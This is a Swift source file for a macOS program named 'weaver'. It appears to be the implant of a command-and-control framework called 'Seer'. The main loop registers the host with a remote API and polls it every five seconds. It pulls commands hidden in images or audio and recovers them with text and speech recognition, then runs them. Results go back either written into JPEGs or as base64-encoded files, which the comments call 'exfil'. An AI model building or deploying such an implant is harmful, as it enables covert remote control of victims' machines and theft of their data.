//
//  main.swift
//  weaver
//
//  Created by AnxiousRabbit on 1/29/23.
//

import Foundation
import UniformTypeIdentifiers
import ASH
import AppKit

// Sanatize inputs
public extension String {
  var sanitized: String {
    return self
      .replacingOccurrences(of: "[^a-zA-Z0-9]", with: " ", options: .regularExpression)
      .replacingOccurrences(of: "\\s+", with: " ", options: .regularExpression)
  }
}

// Base variables and app starting location.
// MODIFY VARIABLES.EXAMPLE.SWIFT. Change it to variables.swift and enter the terraform information there.
let exit = false
let urlDomain = Variables.URL

// Process the hostname
let rawHost = Host.current().localizedName ?? ""
let sanatize = rawHost.sanitized
let hostname = sanatize.replacingOccurrences(of: " ", with: "-").lowercased()

// Call the init function
private var apiRequests = commandComms.init(hostname: hostname)
await apiRequests.jsonSend(path: "seerInit")

// Image loop
while exit == false {
    
    // Check the API for new entries
    await apiRequests.jsonSend(path: "seerGet")
    if apiRequests.commResult != nil {
        for x in apiRequests.commResult {
            print(x)
            let commResult = ASH.command(command: x)
            apiRequests.action = (commResult["returnType"] as! String)
            apiRequests.command = (commResult["inCommand"] as! String)
            
            // Checks if the results are either a String or Error and will either send an image file with a dynmoDB entry or go through an exfil path without dynamo entry
            if commResult["returnType"] as! String  == "String" || commResult["returnType"] as! String == "Error" {
                apiRequests.result = (commResult["returnData"] as! String)
                await apiRequests.imageProcessing()
            }
            else {
                // Will create the data to exfil to Seer
                let returnData = commResult["returnData"] as! Data
                apiRequests.filename = (commResult["fileName"] as! String)
                apiRequests.content = returnData.base64EncodedString(options: Data.Base64EncodingOptions(rawValue: 0))
                await apiRequests.jsonSend(path: "POST")
            }
        }
        apiRequests.commResult = nil
    }
    sleep(5)
}

// Open the directory and monitor a directory for files to appear. Check images already there, process them, and wait for new ones
// TODO: Saving this for future use
private struct directory {
    let directory: String
    var currentFiles: [String]
    var changedFiles: [String]
    var filesToProc: [String]
    let fileManager = FileManager.default
    
    init(directory: String, currentFiles: [String]? = [], changeFiles: [String]? = [], filesToProc: [String]? = []) {
        self.directory = directory
        self.currentFiles = currentFiles!
        self.changedFiles = changeFiles!
        self.filesToProc = filesToProc!
    }

    // Build the array of current files in the folder
    mutating func getDirFiles () {
        do {
            try currentFiles = fileManager.contentsOfDirectory(atPath: directory)
        }
        catch {
            return
        }
    }
    
    // Check for changes. This is done by taking two arrays and changing them to sets and checking for differences
    mutating func newFiles () {
        let tempCurrent = currentFiles
        getDirFiles()
        let firstSet = Set(tempCurrent)
        let secondSet = Set(currentFiles)
        changedFiles = Array(firstSet.symmetricDifference(secondSet))
    }
    
    // Check file types and add it to a list for reprocessing
    mutating func fileExtension () {
        for x in changedFiles {
            // Recreate the file path from x
            let tempPath = URL(filePath: directory + "/" + x)
            do {
                let resourceValue = try tempPath.resourceValues(forKeys: [.contentTypeKey])
                let type = resourceValue.contentType
                guard let description = type?.localizedDescription else {
                    return
                }
                if (description.contains("image")) {
                    filesToProc.append(directory + "/" + x)
                }
            }
            catch {
                print("")
            }
        }
    }
}

// This struct performs all the actions to format the JSON and to call the proper API for dynamo
private class commandComms {
    var action: String!
    var hostname: String
    var command: String!
    var result: String?
    var content: String!
    var filename: String
    var encode: Data!
    var url: String!
    var commResult: [String]!
    var netResponse: Data!
    var time: Double!
    var randImg: Data!
    
    init(filename: String = "", hostname: String) {
        self.filename = filename
        self.hostname = hostname
    }

    // Set the json
    func postFormat() {
        // Create the json Structure for a String command
        let encoder = JSONEncoder()
        url = urlDomain + "/prod/POST"
        if filename.contains("steg_") {
            // This is used to send a command in an image and to the dynamo
            let postRequest = jsonCommands.firstLayer(action: action, table: hostname, item: jsonCommands.item(commandTime: jsonCommands.timeC(N: String(time)), sortTime: jsonCommands.sortTimeC(N: String(time)), command: jsonCommands.commandC(S: command), result: jsonCommands.resultC(S: result!), filename: jsonCommands.filenameC(S: filename), content: jsonCommands.contentC(S: content)))
            encode = try! encoder.encode(postRequest)
        }
        else {
            // This is used to send an exfil file
            let postRequest = jsonCommands.firstLayer(action: action, table: hostname, item: jsonCommands.item(commandTime: jsonCommands.timeC(N: String(Date().timeIntervalSince1970)), sortTime: jsonCommands.sortTimeC(N: String(time)), command: jsonCommands.commandC(S: command), filename: jsonCommands.filenameC(S: filename), content: jsonCommands.contentC(S: content)))
            encode = try! encoder.encode(postRequest)
        }
    }
    
    func hostInit() {
        // Call the init API
        let encoder = JSONEncoder()
        url = urlDomain + "/prod/seerInit"
        let initRequest = initCommands.apiRequest(hostname: hostname)
        encode = try! encoder.encode(initRequest)
    }
    
    func getFormat() {
        // Call the get API
        let encoder = JSONEncoder()
        url = urlDomain + "/prod/seerGet"
        let initRequest = initCommands.apiRequest(hostname: hostname)
        encode = try! encoder.encode(initRequest)
    }
    
    // Communicate the JSON
    func jsonSend(path: String) async {
        // Setup the ML struct
        let imageProcess = imageML()
        let audioProcess = audioML()
        
        switch path {
        case "POST":
            postFormat()
        case "seerInit":
            hostInit()
        case "seerGet":
            getFormat()
        default:
            return
        }
    
        let networkCall = networkComms(url: URL(string: url)!, json: encode)
        
        netResponse = await networkCall.urlSend()
        
        // Decode the JSON we receive when Get is called
        print(path)
        
        // TODO: Check if theres a way to get a status code and check if it is 404. Not really necessary right now
        if path == "seerGet" && !(String(data: netResponse, encoding: .utf8)?.contains("No messages"))! && !(String(data: netResponse, encoding: .utf8)?.contains("Messages"))!{
//            print(String(data: netResponse, encoding: .utf8))
            let decoder = JSONDecoder()
            let getBody = try! decoder.decode(bodyResponse.bodyData.self, from: netResponse)
            self.randImg = Data(base64Encoded: getBody.randImage)
            
            // Check what kind of file
            if getBody.fileType.contains("image") {
                // In future, a check needs to be done to see if the app is running in file mode. For an MVP, this is fine
                imageProcess.imageData = Data(base64Encoded: getBody.body)
                
                // Run the ML
                imageProcess.mlSetup()
                commResult = imageProcess.recognizedStrings
            }
            else if getBody.fileType.contains("audio") {
                audioProcess.writeFile(fileData: Data(base64Encoded: getBody.body)!)
                audioProcess.speechRecognition { transcription in
                    audioProcess.processedAudio = [audioProcess.normalize(audioProcess.results)]
                    self.commResult = audioProcess.processedAudio
                }
            }
        }
    }
    
    // This function is used to add text to images. This is done by receiving an image from Seer and placing text into the image to then send back to Seer
    func imageProcessing() async {
        let image = imageCreation(inText: result!, inImage: NSImage(data: self.randImg)!, imgCoordinate: CGPoint(x: 20, y: -20))
        let bitmap = NSBitmapImageRep(cgImage: image.cgImage(forProposedRect: nil, context: nil, hints: nil)!)
        let bitmapData = bitmap.representation(using: .jpeg, properties: [:])
        content = bitmapData!.base64EncodedString(options: Data.Base64EncodingOptions(rawValue: 0))
        time = Date().timeIntervalSince1970
        filename = "steg_" + String(time) + ".jpg"
        await jsonSend(path: "POST")
    }
    
    // Add text to an image based on the coordinate
    func imageCreation(inText: String, inImage: NSImage, imgCoordinate: CGPoint) -> NSImage {
        // Create all the variables needed to set text color, size, and font
        let size = CGSize(width: inImage.size.width, height: inImage.size.height)
        let targetImage = NSImage(size: size, flipped: false) { (destRect: CGRect) -> Bool in
            inImage.draw(in: destRect)
            let textColor = NSColor.white
            let textFont = NSFont(name: "Menlo", size: 16)
            
            // Apply the attributes
            let textFontAttributes = [
                NSAttributedString.Key.font: textFont as Any,
                NSAttributedString.Key.foregroundColor: textColor,
                ] as [NSAttributedString.Key : Any]
            
            // Create a rectangle from the size of the initial image combining the coordinates. Then draw the text onto the image
            let rect = CGRect(origin: imgCoordinate, size: size)
            inText.draw(in: rect, withAttributes: textFontAttributes)
            return true
        }
        return targetImage
    }
}
